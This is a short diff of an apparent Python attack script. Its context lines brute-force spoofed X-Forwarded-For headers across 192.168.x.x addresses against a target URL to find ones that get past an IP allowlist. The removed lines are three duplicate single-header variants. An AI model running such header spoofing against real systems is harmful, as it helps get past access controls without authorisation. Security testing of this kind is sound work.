@@ -33,15 +33,3 @@ def attack(number,url):
         s = requests.get(url,headers={"X-Forwarded-For" : "192.168.{}.{}".format(n,i)})
         if (s.status_code == 200):
             print("X-Forwarded-For: 192.168.{}.{}".format(n,i))
-def attack2(number,url):
-        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
-        if (s.status_code == 200):
-            print("X-Forwarded-For:", number)
-def attack3(number,url):
-        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
-        if (s.status_code == 200):
-            print("X-Forwarded-For:", number)
-def attack4(number,url):
-        s = requests.get(url,headers={"X-Forwarded-For" : str(number)})
-        if (s.status_code == 200):
-            print("X-Forwarded-For:", number)
